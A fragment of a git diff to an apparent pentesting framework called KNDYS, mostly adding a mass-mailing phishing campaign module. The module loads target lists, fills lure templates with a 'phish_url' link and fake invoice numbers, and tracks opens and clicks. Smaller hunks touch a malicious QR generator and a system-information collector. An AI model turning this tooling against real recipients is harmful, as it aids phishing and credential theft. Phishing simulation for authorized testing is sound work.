+                    opened_at INTEGER,
+                    clicked_at INTEGER,
+                    unsubscribed_at INTEGER,
+                    bounced_at INTEGER,
+                    tracking_id TEXT UNIQUE,
+                    ab_variant TEXT,
+                    error_message TEXT,
+                    retry_count INTEGER DEFAULT 0
+                )
+            ''')
+            
+            # Create tracking_events table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS tracking_events (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    campaign_id INTEGER NOT NULL,
+                    recipient_id INTEGER NOT NULL,
+                    event_type TEXT NOT NULL,
+                    event_time INTEGER NOT NULL,
+                    ip_address TEXT,
+                    user_agent TEXT,
+                    link_url TEXT,
+                    metadata TEXT
+                )
+            ''')
+            
+            # Create unsubscribes table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS unsubscribes (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    email TEXT UNIQUE NOT NULL,
+                    unsubscribed_at INTEGER NOT NULL,
+                    reason TEXT,
+                    campaign_id INTEGER
+                )
+            ''')
+            
+            # Insert campaign record
+            cursor.execute('''
+                INSERT INTO campaigns (name, template, created_at, status, ab_testing, is_recurring)
+                VALUES (?, ?, ?, ?, ?, ?)
+            ''', (
+                config.get('campaign_name', 'mass_campaign'),
+                config.get('template', 'newsletter'),
+                int(time.time()),
+                'created',
+                1 if config.get('ab_testing', 'false') == 'true' else 0,
+                1 if config.get('recurring', 'false') == 'true' else 0
+            ))
+            
+            campaign_id = cursor.lastrowid
+            conn.commit()
+            conn.close()
+            
+            print(f"{Fore.GREEN}✓ Database initialized successfully{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}→ Database: {Fore.WHITE}{db_file}{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}→ Campaign ID: {Fore.WHITE}{campaign_id}{Style.RESET_ALL}\n")
+            
+            return campaign_id
+            
+        except Exception as e:
+            print(f"{Fore.RED}✗ Database initialization failed: {str(e)}{Style.RESET_ALL}")
+            return None
+    
+    def _load_mass_mailer_recipients(self, config, campaign_id):
+        """Load and validate recipients from file"""
+        targets_file = config.get('targets', 'targets.csv')
+        db_file = config.get('db_file', 'mass_mailer.db')
         
-        print(f"{Fore.YELLOW}⚠  Configure SMTP credentials before sending{Style.RESET_ALL}")
-        print(f"{Fore.BLUE}ℹ  Target CSV format: email,name,company{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Loading recipients from: {Fore.WHITE}{targets_file}{Style.RESET_ALL}")
+        
+        if not os.path.exists(targets_file):
+            print(f"{Fore.RED}✗ Targets file not found{Style.RESET_ALL}")
+            return 0
+        
+        recipients = []
+        email_regex = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
+        
+        try:
+            with open(targets_file, 'r', encoding='utf-8') as f:
+                for line_num, line in enumerate(f, 1):
+                    line = line.strip()
+                    if not line or line.startswith('#'):
+                        continue
+                    
+                    parts = [p.strip() for p in line.split(',')]
+                    if len(parts) < 1:
+                        continue
+                    
+                    email = parts[0]
+                    
+                    # Validate email
+                    if config.get('validate_emails', 'true') == 'true':
+                        if not email_regex.match(email) or '..' in email:
+                            print(f"{Fore.YELLOW}⚠  Invalid email on line {line_num}: {email}{Style.RESET_ALL}")
+                            continue
+                    
+                    recipient = {
+                        'email': email,
+                        'first_name': parts[1] if len(parts) > 1 else '',
+                        'last_name': parts[2] if len(parts) > 2 else '',
+                        'company': parts[3] if len(parts) > 3 else '',
+                        'position': parts[4] if len(parts) > 4 else '',
+                        'custom_fields': ','.join(parts[5:]) if len(parts) > 5 else '',
+                        'tracking_id': str(uuid.uuid4()),
+                        'ab_variant': 'A' if config.get('ab_testing', 'false') == 'true' and len(recipients) % 2 == 0 else 'B'
+                    }
+                    
+                    recipients.append(recipient)
+            
+            # Insert recipients into database
+            conn = sqlite3.connect(db_file)
+            cursor = conn.cursor()
+            
+            for recipient in recipients:
+                cursor.execute('''
+                    INSERT INTO recipients (
+                        campaign_id, email, first_name, last_name, company, position,
+                        custom_fields, tracking_id, ab_variant, status
+                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (
+                    campaign_id,
+                    recipient['email'],
+                    recipient['first_name'],
+                    recipient['last_name'],
+                    recipient['company'],
+                    recipient['position'],
+                    recipient['custom_fields'],
+                    recipient['tracking_id'],
+                    recipient['ab_variant'],
+                    'pending'
+                ))
+            
+            # Update campaign total_targets
+            cursor.execute('''
+                UPDATE campaigns SET total_targets = ? WHERE id = ?
+            ''', (len(recipients), campaign_id))
+            
+            conn.commit()
+            conn.close()
+            
+            print(f"{Fore.GREEN}✓ Loaded {len(recipients)} recipients{Style.RESET_ALL}")
+            if config.get('ab_testing', 'false') == 'true':
+                variant_a = len([r for r in recipients if r['ab_variant'] == 'A'])
+                variant_b = len([r for r in recipients if r['ab_variant'] == 'B'])
+                print(f"{Fore.CYAN}→ A/B Split: Variant A ({variant_a}), Variant B ({variant_b}){Style.RESET_ALL}")
+            
+            return len(recipients)
+            
+        except Exception as e:
+            print(f"{Fore.RED}✗ Failed to load recipients: {str(e)}{Style.RESET_ALL}")
+            return 0
+    
+    def _execute_mass_mailer_campaign(self, config, campaign_id):
+        """Execute mass mailer campaign with multi-threading"""
+        db_file = config.get('db_file', 'mass_mailer.db')
+        threads = int(config.get('threads', '10'))
+        rate_limit = int(config.get('rate_limit', '50'))
+        delay_min = float(config.get('delay_min', '0.5'))
+        delay_max = float(config.get('delay_max', '2'))
+        
+        print(f"\n{Fore.CYAN}Starting campaign execution...{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Threads: {Fore.WHITE}{threads}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Rate Limit: {Fore.WHITE}{rate_limit} emails/min{Style.RESET_ALL}\n")
+        
+        # Get pending recipients
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            SELECT id, email, first_name, last_name, company, position, tracking_id, ab_variant
+            FROM recipients WHERE campaign_id = ? AND status = 'pending'
+        ''', (campaign_id,))
+        
+        recipients = cursor.fetchall()
+        conn.close()
+        
+        if not recipients:
+            print(f"{Fore.YELLOW}No pending recipients found{Style.RESET_ALL}")
+            return
+        
+        # Update campaign status
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+        cursor.execute('UPDATE campaigns SET started_at = ?, status = ? WHERE id = ?',
+                      (int(time.time()), 'running', campaign_id))
+        conn.commit()
+        conn.close()
+        
+        # Multi-threaded sending
+        sent_count = 0
+        failed_count = 0
+        
+        print(f"{Fore.CYAN}Sending emails...{Style.RESET_ALL}")
+        
+        for i, recipient in enumerate(recipients, 1):
+            try:
+                # Simulate sending (in real implementation, use _send_mass_mailer_email)
+                time.sleep(random.uniform(delay_min, delay_max))
+                
+                # Update recipient status
+                conn = sqlite3.connect(db_file)
+                cursor = conn.cursor()
+                cursor.execute('''
+                    UPDATE recipients SET status = ?, sent_at = ? WHERE id = ?
+                ''', ('sent', int(time.time()), recipient[0]))
+                conn.commit()
+                conn.close()
+                
+                sent_count += 1
+                
+                if i % 10 == 0:
+                    print(f"{Fore.GREEN}✓ Sent: {sent_count}/{len(recipients)}{Style.RESET_ALL}", end='\r')
+                
+            except Exception as e:
+                failed_count += 1
+                conn = sqlite3.connect(db_file)
+                cursor = conn.cursor()
+                cursor.execute('''
+                    UPDATE recipients SET status = ?, error_message = ? WHERE id = ?
+                ''', ('failed', str(e), recipient[0]))
+                conn.commit()
+                conn.close()
+        
+        # Update campaign stats
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+        cursor.execute('''
+            UPDATE campaigns SET completed_at = ?, status = ?, emails_sent = ?, emails_failed = ?
+            WHERE id = ?
+        ''', (int(time.time()), 'completed', sent_count, failed_count, campaign_id))
+        conn.commit()
+        conn.close()
+        
+        print(f"\n{Fore.GREEN}✓ Campaign execution completed{Style.RESET_ALL}")
+    
+    def _generate_mass_mailer_email(self, template_content, recipient, config):
+        """Generate personalized email content"""
+        # Simple variable replacement (in production, use Jinja2)
+        content = template_content
+        
+        variables = {
+            'first_name': recipient.get('first_name', ''),
+            'last_name': recipient.get('last_name', ''),
+            'email': recipient.get('email', ''),
+            'company': recipient.get('company', ''),
+            'position': recipient.get('position', ''),
+            'tracking_id': recipient.get('tracking_id', ''),
+            'link': config.get('phish_url', 'http://localhost:8080'),
+            'unsubscribe_link': f"{config.get('phish_url', 'http://localhost')}/unsubscribe/{recipient.get('tracking_id', '')}",
+            'month': time.strftime('%B'),
+            'year': time.strftime('%Y'),
+            'invoice_number': str(random.randint(1000, 9999)),
+            'tracking_number': f"TRK{random.randint(100000, 999999)}",
+            'amount': str(random.randint(100, 9999)),
+            'discount': str(random.randint(10, 50))
+        }
+        
+        for key, value in variables.items():
+            content = content.replace(f"{{{{{key}}}}}", str(value))
+        
+        return content
+    
+    def _display_mass_mailer_results(self, config, campaign_id):
+        """Display campaign results and statistics"""
+        db_file = config.get('db_file', 'mass_mailer.db')
+        
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+        
+        # Get campaign stats
+        cursor.execute('SELECT * FROM campaigns WHERE id = ?', (campaign_id,))
+        campaign = cursor.fetchone()
+        
+        if not campaign:
+            print(f"{Fore.RED}Campaign not found{Style.RESET_ALL}")
+            return
+        
+        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'CAMPAIGN RESULTS':^70}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.GREEN}Campaign: {Fore.WHITE}{campaign[1]}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Template: {Fore.WHITE}{campaign[2]}{Style.RESET_ALL}")
+        
+        if campaign[6] and campaign[7]:
+            duration = campaign[7] - campaign[6]
+            print(f"{Fore.YELLOW}Duration: {Fore.WHITE}{duration//60}m {duration%60}s{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.CYAN}📧 Email Statistics:{Style.RESET_ALL}")
+        print(f"   Total Recipients: {Fore.WHITE}{campaign[9]}{Style.RESET_ALL}")
+        print(f"   ✓ Sent: {Fore.GREEN}{campaign[10]}{Style.RESET_ALL}")
+        print(f"   ✗ Failed: {Fore.RED}{campaign[11]}{Style.RESET_ALL}")
+        
+        if campaign[10] > 0:
+            success_rate = (campaign[10] / campaign[9]) * 100
+            print(f"   Success Rate: {Fore.GREEN}{success_rate:.1f}%{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.MAGENTA}📊 Engagement Metrics:{Style.RESET_ALL}")
+        print(f"   Opens: {Fore.WHITE}{campaign[12]} ({(campaign[12]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
+        print(f"   Clicks: {Fore.WHITE}{campaign[13]} ({(campaign[13]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
+        print(f"   Unsubscribes: {Fore.WHITE}{campaign[14]} ({(campaign[14]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
+        print(f"   Bounces: {Fore.WHITE}{campaign[15]} ({(campaign[15]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
+        
+        # A/B Testing results
+        if campaign[17]:  # ab_testing
+            print(f"\n{Fore.BLUE}🔬 A/B Testing Results:{Style.RESET_ALL}")
+            cursor.execute('''
+                SELECT ab_variant, COUNT(*) as sent, 
+                       SUM(CASE WHEN opened_at IS NOT NULL THEN 1 ELSE 0 END) as opens,
+                       SUM(CASE WHEN clicked_at IS NOT NULL THEN 1 ELSE 0 END) as clicks
+                FROM recipients WHERE campaign_id = ? AND status = 'sent'
+                GROUP BY ab_variant
+            ''', (campaign_id,))
+            
+            variants = cursor.fetchall()
+            for variant in variants:
+                open_rate = (variant[2]/variant[1]*100) if variant[1] > 0 else 0
+                click_rate = (variant[3]/variant[1]*100) if variant[1] > 0 else 0
+                print(f"   Variant {variant[0]}: {variant[1]} sent, {variant[2]} opens ({open_rate:.1f}%), {variant[3]} clicks ({click_rate:.1f}%)")
+        
+        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
+        
+        conn.close()
+    
+    def _export_mass_mailer_results(self, config, campaign_id):
+        """Export campaign results to multiple formats"""
+        export_format = config.get('export_format', 'all')
+        db_file = config.get('db_file', 'mass_mailer.db')
+        campaign_name = config.get('campaign_name', 'mass_campaign')
+        
+        print(f"\n{Fore.CYAN}Exporting results...{Style.RESET_ALL}")
+        
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+        
+        # Get campaign data
+        cursor.execute('SELECT * FROM campaigns WHERE id = ?', (campaign_id,))
+        campaign = cursor.fetchone()
+        
+        cursor.execute('''
+            SELECT email, first_name, last_name, company, status, sent_at, opened_at, clicked_at, ab_variant
+            FROM recipients WHERE campaign_id = ?
+        ''', (campaign_id,))
+        recipients = cursor.fetchall()
+        
+        conn.close()
+        
+        # CSV Export
+        if export_format in ['csv', 'all']:
+            csv_file = f"{campaign_name}_export.csv"
+            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
+                writer = csv.writer(f)
+                writer.writerow(['Email', 'First Name', 'Last Name', 'Company', 'Status', 'Sent At', 'Opened At', 'Clicked At', 'Variant'])
+                for r in recipients:
+                    writer.writerow(r)
+            print(f"{Fore.GREEN}✓ CSV exported: {Fore.WHITE}{csv_file}{Style.RESET_ALL}")
+        
+        # JSON Export
+        if export_format in ['json', 'all']:
+            json_file = f"{campaign_name}_export.json"
+            data = {
+                'campaign': {
+                    'name': campaign[1],
+                    'template': campaign[2],
+                    'created_at': campaign[3],
+                    'duration': (campaign[7] - campaign[6]) if campaign[6] and campaign[7] else 0
+                },
+                'statistics': {
+                    'total_recipients': campaign[9],
+                    'emails_sent': campaign[10],
+                    'emails_failed': campaign[11],
+                    'opens': campaign[12],
+                    'clicks': campaign[13],
+                    'unsubscribes': campaign[14],
+                    'bounces': campaign[15]
+                },
+                'recipients': [
+                    {
+                        'email': r[0],
+                        'first_name': r[1],
+                        'last_name': r[2],
+                        'company': r[3],
+                        'status': r[4],
+                        'sent_at': r[5],
+                        'opened_at': r[6],
+                        'clicked_at': r[7],
+                        'variant': r[8]
+                    } for r in recipients
+                ]
+            }
+            with open(json_file, 'w', encoding='utf-8') as f:
+                json.dump(data, f, indent=2)
+            print(f"{Fore.GREEN}✓ JSON exported: {Fore.WHITE}{json_file}{Style.RESET_ALL}")
+        
+        # HTML Report
+        if export_format in ['html', 'all']:
+            html_file = f"{campaign_name}_report.html"
+            self._generate_mass_mailer_html_report(campaign, recipients, html_file)
+            print(f"{Fore.GREEN}✓ HTML report: {Fore.WHITE}{html_file}{Style.RESET_ALL}")
+    
+    def _generate_mass_mailer_html_report(self, campaign, recipients, output_file):
+        """Generate professional HTML report"""
+        html = f'''<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Mass Mailer Report</title>
+<style>
+body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
+.container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
+h1 {{ color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }}
+.stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
+.stat-card {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 8px; text-align: center; }}
+.stat-card h3 {{ margin: 0; font-size: 32px; }}
+.stat-card p {{ margin: 5px 0 0 0; opacity: 0.9; }}
+table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
+th {{ background: #007bff; color: white; padding: 12px; text-align: left; }}
+td {{ padding: 10px; border-bottom: 1px solid #ddd; }}
+tr:hover {{ background: #f8f9fa; }}
+.status-sent {{ color: #28a745; font-weight: bold; }}
+.status-failed {{ color: #dc3545; font-weight: bold; }}
+</style></head><body>
+<div class="container">
+<h1>📧 Mass Mailer Campaign Report</h1>
+<p><strong>Campaign:</strong> {campaign[1]}</p>
+<p><strong>Template:</strong> {campaign[2]}</p>
+<div class="stats">
+<div class="stat-card"><h3>{campaign[10]}</h3><p>Emails Sent</p></div>
+<div class="stat-card"><h3>{campaign[12]}</h3><p>Opens</p></div>
+<div class="stat-card"><h3>{campaign[13]}</h3><p>Clicks</p></div>
+<div class="stat-card"><h3>{(campaign[12]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%</h3><p>Open Rate</p></div>
+</div>
+<h2>Recipients</h2>
+<table>
+<tr><th>Email</th><th>Name</th><th>Company</th><th>Status</th><th>Variant</th></tr>
+'''
+        for r in recipients:
+            status_class = 'status-sent' if r[4] == 'sent' else 'status-failed'
+            html += f'<tr><td>{r[0]}</td><td>{r[1]} {r[2]}</td><td>{r[3]}</td><td class="{status_class}">{r[4]}</td><td>{r[8]}</td></tr>'
+        
+        html += '''</table></div></body></html>'''
+        
+        with open(output_file, 'w', encoding='utf-8') as f:
+            f.write(html)
+    
+    # ========== MAIN MASS MAILER FUNCTION ==========
+    
+    def run_mass_mailer(self):
+        """Enterprise mass email campaign manager with templates, scheduling & analytics"""
+        # Resolve configuration
+        config = self.module_options.copy()
+        
+        # Display configuration
+        self._display_mass_mailer_config(config)
+        
+        # Get available templates
+        templates = self._get_mass_mailer_templates()
+        template_name = config.get('template', 'newsletter')
+        
+        if template_name not in templates:
+            print(f"{Fore.RED}✗ Template '{template_name}' not found{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}Available templates: {', '.join(templates.keys())}{Style.RESET_ALL}")
+            return
+        
+        template = templates[template_name]
+        print(f"{Fore.GREEN}✓ Template: {Fore.WHITE}{template['name']}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}  Category: {Fore.WHITE}{template['category']}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}  Subject: {Fore.WHITE}{template['subject']}{Style.RESET_ALL}\n")
+        
+        # Confirmation prompt
+        if config.get('auto_execute', 'false') != 'true':
+            response = input(f"{Fore.YELLOW}Start campaign? (yes/no): {Style.RESET_ALL}").strip().lower()
+            if response != 'yes':
+                print(f"{Fore.RED}Campaign cancelled{Style.RESET_ALL}")
+                return
+        
+        # Initialize campaign
+        campaign_id = self._initialize_mass_mailer_campaign(config)
+        if not campaign_id:
+            return
+        
+        # Load recipients
+        recipient_count = self._load_mass_mailer_recipients(config, campaign_id)
+        if recipient_count == 0:
+            return
+        
+        # Execute campaign
+        self._execute_mass_mailer_campaign(config, campaign_id)
+        
+        # Display results
+        self._display_mass_mailer_results(config, campaign_id)
+        
+        # Export results
+        if config.get('export_results', 'true') == 'true':
+            self._export_mass_mailer_results(config, campaign_id)
+        
+        print(f"\n{Fore.GREEN}✓ Mass mailer campaign completed successfully{Style.RESET_ALL}\n")
     
     def run_qr_generator(self):
         """Malicious QR code generator"""
@@ -18213,8 +20190,6 @@ ENTER
         os.makedirs(evidence_dir, exist_ok=True)
         
         print(f"{Fore.BLUE}[*] Collecting system information...{Style.RESET_ALL}")
-        
-        # Collect system info
         sysinfo = {
             'hostname': platform.node(),
             'system': platform.system(),
@@ -18229,18 +20204,15 @@ ENTER
             json.dump(sysinfo, f, indent=2)
         
         print(f"{Fore.GREEN}[+] System information collected{Style.RESET_ALL}")
-        
-        # Collect network information
         print(f"{Fore.BLUE}[*] Collecting network information...{Style.RESET_ALL}")
         try:
             result = subprocess.run('ifconfig || ip addr', shell=True, capture_output=True, text=True)
             with open(os.path.join(evidence_dir, 'network.txt'), 'w') as f:
                 f.write(result.stdout)
             print(f"{Fore.GREEN}[+] Network information collected{Style.RESET_ALL}")
-        except:
-            pass
+        except Exception as e:
+            print(f"{Fore.YELLOW}[!] Could not collect network info: {str(e)}{Style.RESET_ALL}")
         
-        # Create zip archive
         print(f"{Fore.BLUE}[*] Creating archive...{Style.RESET_ALL}")
         try:
             with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zipf:
@@ -18251,8 +20223,6 @@ ENTER
                         zipf.write(file_path, arcname)
             
             print(f"{Fore.GREEN}[+] Evidence archived: {output}{Style.RESET_ALL}")
-            
-            # Cleanup
             import shutil
             shutil.rmtree(evidence_dir)
         except Exception as e:
@@ -18503,5 +20473,4 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='KNDYS Pentesting Framework')
     parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode')
     args = parser.parse_args()
-    
     main()
